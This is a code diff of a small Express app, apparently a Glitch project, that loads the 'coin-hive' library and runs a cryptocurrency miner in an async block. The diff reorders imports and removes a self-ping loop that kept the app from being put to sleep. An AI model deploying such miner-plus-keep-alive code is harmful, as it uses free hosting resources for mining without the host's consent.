@@ -1,24 +1,15 @@
-const http = require('http');
 const express = require('express');
-const CoinHive = require('coin-hive');
 const app = express();
-
 
 app.get("/", (request, response) => {
   console.log(Date.now() + " Ping Received");
   response.sendStatus(200);
 });
-app.listen(process.env.PORT);
-setInterval(() => {
-  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
-}, 280000);
 
 app.use(express.static('public'));
 
-// http://expressjs.com/en/starter/basic-routing.html
-app.get('/', function(request, response) {
-  response.sendFile(__dirname + '/views/index.html');
-});
+const CoinHive = require('coin-hive');
+const http = require('http');  
 
 (async () => {
  
@@ -55,3 +46,4 @@ app.get('/', function(request, response) {
   // Stop miner
   //setTimeout(async () => await miner.stop(), 60000);
 })();
+
